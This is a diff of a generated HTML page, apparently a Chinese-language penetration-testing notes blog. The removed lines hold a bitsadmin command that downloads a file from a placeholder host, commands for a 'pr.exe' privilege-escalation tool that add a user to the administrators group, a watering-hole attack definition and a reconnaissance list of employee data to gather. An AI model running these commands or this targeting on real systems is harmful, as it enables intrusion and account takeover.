-<h3 id="2-使用bitsadmin命令"><a href="#2-使用bitsadmin命令" class="headerlink" title="2.使用bitsadmin命令"></a>2.使用bitsadmin命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://www.xx.com/code.jpg c:\users\sdyp\desktop\ff.jpg</span><br></pre></td></tr></table></figure>
-<h2 id="PR提权"><a href="#PR提权" class="headerlink" title="PR提权"></a>PR提权</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pr.exe &quot;net user chessur 123.com /add&quot; 添加用户</span><br><span class="line">pr.exe &quot;net localgroup chessur /add&quot; 将用户加入管理员组</span><br></pre></td></tr></table></figure>
-<h1 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h1><h2 id="钓鱼攻击"><a href="#钓鱼攻击" class="headerlink" title="钓鱼攻击"></a>钓鱼攻击</h2><h3 id="水坑攻击"><a href="#水坑攻击" class="headerlink" title="水坑攻击"></a>水坑攻击</h3><p>一种计算机入侵手法，其针对的目标多为特定的团体（组织、行业、地区等）。攻击者首先通过猜测（或观察）确定这组目标经常访问的网站，并入侵其中一个或多个，植入恶意软件，最后，达到感染该组目标中部分成员的目的。</p>
-<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="员工信息"><a href="#员工信息" class="headerlink" title="员工信息"></a>员工信息</h2><p>社交关系网<br>博客<br>工资银行账户</p>
-<p>企业使用软件信息<br>业务伙伴<br>销售银行账号<br>招聘岗位</p>
-<h1 id="JavaScript编码"><a href="#JavaScript编码" class="headerlink" title="JavaScript编码"></a>JavaScript编码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var code = &apos;\u003c&apos;</span><br><span class="line">code</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1397,6 +1310,8 @@
                     
                       
                     
+                      
+                    
                     <span class="site-state-item-count">7</span>
                     <span class="site-state-item-name">categories</span>
                   </a>
@@ -1413,6 +1328,8 @@
                     
                   
                     
+                    
+                      
                     
                       
                     
